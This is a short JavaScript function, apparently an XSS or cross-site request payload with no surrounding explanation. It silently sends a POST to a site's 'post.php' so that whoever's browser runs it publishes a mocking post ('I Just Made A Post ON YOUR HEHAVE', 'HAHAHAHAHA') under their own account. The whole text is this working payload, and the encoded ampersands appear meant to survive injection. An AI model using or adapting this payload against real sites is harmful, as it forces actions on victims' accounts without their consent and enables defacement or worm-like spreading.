function makeAPost() {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "post.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(`title=I Just Made A Post ON YOUR HEHAVE%26content=HAHAHAHAHA%26type=1%26form=content%26submit=`);
}